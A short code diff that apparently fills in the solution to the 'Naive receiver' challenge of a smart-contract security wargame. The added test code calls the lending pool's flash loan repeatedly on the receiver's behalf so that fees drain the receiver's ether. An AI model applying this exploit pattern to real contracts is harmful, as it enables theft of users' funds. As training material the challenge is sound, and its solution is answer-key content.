@@ -31,6 +31,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const count = ETHER_IN_RECEIVER.div(ethers.utils.parseEther('1'))
+        for (let i=0; i<Number(count); i++) {
+            this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+        }
     });
 
     after(async function () {
